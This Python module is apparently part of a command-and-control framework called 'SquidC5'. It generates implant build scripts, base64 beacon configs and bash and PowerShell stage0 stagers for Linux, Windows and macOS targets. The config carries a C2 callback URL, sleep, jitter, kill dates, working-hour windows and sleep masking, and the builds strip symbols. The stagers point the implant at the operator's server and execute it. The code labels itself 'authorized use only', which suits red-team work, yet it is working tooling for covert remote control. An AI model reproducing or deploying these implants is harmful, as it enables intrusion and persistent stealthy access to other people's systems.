"""Implant build factory - emits build scripts, config blob, stagers (authorized only)."""

from __future__ import annotations

import base64
import json
import textwrap
from pathlib import Path
from typing import Any

SUPPORTED = {
    ("linux", "amd64"),
    ("linux", "arm64"),
    ("windows", "amd64"),
    ("windows", "386"),
    ("darwin", "amd64"),
    ("darwin", "arm64"),
}


def build_config_blob(
    *,
    url: str,
    psk: str = "",
    sleep: float = 5.0,
    jitter: float = 20.0,
    kill_date: int | None = None,
    max_miss: int = 0,
    work_start: int = 0,
    work_end: int = 0,
    channel: str = "http",
    ws_url: str | None = None,
    sleep_mask: str = "jitter",
) -> dict[str, Any]:
    """JSON config for SC5_CONFIG_B64 / -ldflags bakedConfigJSON."""
    cfg: dict[str, Any] = {
        "url": url,
        "psk": psk,
        "sleep": sleep,
        "jitter": jitter,
        "kill_date": int(kill_date or 0),
        "max_miss": int(max_miss or 0),
        "work_start": int(work_start or 0),
        "work_end": int(work_end or 0),
        "channel": (channel or "http").lower(),
        "sleep_mask": sleep_mask or "jitter",
        "version": "3.0.0",
    }
    if ws_url:
        cfg["ws_url"] = ws_url
    elif cfg["channel"] == "ws":
        cfg["ws_url"] = (
            url.replace("https://", "wss://")
            .replace("http://", "ws://")
            .replace("/api/v1/implant/beacon", "/ws/v1/beacon")
        )
    raw = json.dumps(cfg, separators=(",", ":")).encode()
    b64 = base64.b64encode(raw).decode()
    return {
        "config": cfg,
        "config_b64": b64,
        "ldflags_note": "Prefer SC5_CONFIG_B64 at runtime; optional -X main.bakedConfigJSON for lab builds",
    }


def build_plan(
    *,
    os_name: str,
    arch: str,
    host: str,
    port: int,
    path: str = "/api/v1/implant/beacon",
    scheme: str = "https",
    sleep: float = 5.0,
    jitter: float = 20.0,
    kill_date: int | None = None,
    max_miss: int = 0,
    work_start: int = 0,
    work_end: int = 0,
    psk_placeholder: str = "${SC5_PSK}",
    channel: str = "http",
    sleep_mask: str = "jitter",
    psk: str | None = None,
) -> dict[str, Any]:
    os_l = os_name.lower().strip()
    arch_l = arch.lower().strip()
    if (os_l, arch_l) not in SUPPORTED:
        raise ValueError(f"unsupported target {os_l}/{arch_l}; allowed={sorted(SUPPORTED)}")
    sch = scheme if scheme in ("http", "https") else "https"
    url = f"{sch}://{host}:{port}{path}"
    ext = ".exe" if os_l == "windows" else ""
    out_name = f"sc5beacon-{os_l}-{arch_l}{ext}"

    blob = build_config_blob(
        url=url,
        psk=psk or "",
        sleep=sleep,
        jitter=jitter,
        kill_date=kill_date,
        max_miss=max_miss,
        work_start=work_start,
        work_end=work_end,
        channel=channel,
        sleep_mask=sleep_mask,
    )
    # Factory scripts never embed live PSK unless caller passed psk=
    run_cfg = dict(blob["config"])
    if not psk:
        run_cfg["psk"] = ""
    run_b64 = base64.b64encode(json.dumps(run_cfg, separators=(",", ":")).encode()).decode()

    env_lines = [
        f"export SC5_CONFIG_B64={json.dumps(run_b64)}",
        f'# or: export SC5_URL={json.dumps(url)}',
        f"export SC5_PSK={psk_placeholder}",
        f"export SC5_SLEEP={sleep}",
        f"export SC5_JITTER={jitter}",
        f"export SC5_CHANNEL={json.dumps(channel)}",
        f"export SC5_SLEEP_MASK={json.dumps(sleep_mask)}",
    ]
    if kill_date:
        env_lines.append(f"export SC5_KILL_DATE={int(kill_date)}")
    if max_miss:
        env_lines.append(f"export SC5_MAX_MISS={int(max_miss)}")
    if work_start or work_end:
        env_lines.append(f"export SC5_WORK_START={int(work_start)}")
        env_lines.append(f"export SC5_WORK_END={int(work_end)}")

    build_sh = textwrap.dedent(
        f"""\
        #!/bin/sh
        # SquidC5 implant factory - authorized use only
        set -e
        cd "$(dirname "$0")/../../agents/sc5beacon" 2>/dev/null || cd agents/sc5beacon
        go mod tidy
        GOOS={os_l} GOARCH={arch_l} go build -ldflags='-s -w' -o ../../../dist/{out_name} .
        echo "built dist/{out_name}"
        """
    )

    run_sh = "#!/bin/sh\n# authorized use only\n" + "\n".join(env_lines) + f"\nexec ./dist/{out_name}\n"

    stager_bash = generate_stage0_bash(host=host, port=port, scheme=sch, channel=channel)
    stager_ps1 = generate_stage0_ps1(host=host, port=port, scheme=sch)

    return {
        "os": os_l,
        "arch": arch_l,
        "output": out_name,
        "url": url,
        "channel": channel,
        "config_blob_b64": run_b64,
        "config": run_cfg,
        "env": {
            "SC5_URL": url,
            "SC5_SLEEP": sleep,
            "SC5_JITTER": jitter,
            "SC5_KILL_DATE": kill_date,
            "SC5_MAX_MISS": max_miss,
            "SC5_CHANNEL": channel,
            "SC5_CONFIG_B64": run_b64,
        },
        "build_script": build_sh,
        "run_script": run_sh,
        "stager_bash": stager_bash,
        "stager_ps1": stager_ps1,
        "notes": [
            "Prefer SC5_CONFIG_B64 over individual env vars",
            "Copy server data/implant_psk.txt into SC5_PSK (never commit)",
            "TLS verify on - install lab CA or use trusted certs",
            "Authorized testing only",
        ],
        "agent_path": "agents/sc5beacon",
        "agent_version": "3.0.0",
    }


def generate_stage0_bash(
    *,
    host: str,
    port: int,
    scheme: str = "https",
    channel: str = "http",
    stage_url: str | None = None,
) -> str:
    """Stage0 bash: fetch stage1 binary URL or drop config + exec native beacon path."""
    base = f"{scheme}://{host}:{port}"
    url = stage_url or f"{base}/api/v1/implant/beacon"
    return textwrap.dedent(
        f"""\
        #!/bin/bash
        # SquidC5 stage0 stager (bash) - authorized lab only
        set -euo pipefail
        C2={json.dumps(base)}
        BEACON_URL={json.dumps(url)}
        CHANNEL={json.dumps(channel)}
        # Operator places stage1 binary next to stager or downloads from approved drop:
        STAGE1="${{SC5_STAGE1:-./sc5beacon}}"
        if [[ ! -x "$STAGE1" ]]; then
          echo "place stage1 native beacon at $STAGE1 or set SC5_STAGE1" >&2
          exit 1
        fi
        export SC5_URL="$BEACON_URL"
        export SC5_CHANNEL="$CHANNEL"
        export SC5_PSK="${{SC5_PSK:?set SC5_PSK from teamserver implant_psk.txt}}"
        export SC5_SLEEP="${{SC5_SLEEP:-5}}"
        export SC5_JITTER="${{SC5_JITTER:-20}}"
        exec "$STAGE1"
        """
    )


def generate_stage0_ps1(
    *,
    host: str,
    port: int,
    scheme: str = "https",
    stage_url: str | None = None,
) -> str:
    base = f"{scheme}://{host}:{port}"
    url = stage_url or f"{base}/api/v1/implant/beacon"
    return textwrap.dedent(
        f"""\
        # SquidC5 stage0 stager (PowerShell) - authorized lab only
        $ErrorActionPreference = "Stop"
        $env:SC5_URL = {json.dumps(url)}
        if (-not $env:SC5_PSK) {{ throw "Set SC5_PSK from teamserver implant_psk.txt" }}
        $stage1 = if ($env:SC5_STAGE1) {{ $env:SC5_STAGE1 }} else {{ ".\\sc5beacon.exe" }}
        if (-not (Test-Path $stage1)) {{ throw "Place stage1 at $stage1" }}
        & $stage1
        """
    )


def agent_source_tree(root: Path | None = None) -> list[str]:
    base = root or Path(__file__).resolve().parents[3] / "agents" / "sc5beacon"
    if not base.is_dir():
        return []
    return sorted(str(p.relative_to(base)) for p in base.rglob("*") if p.is_file())
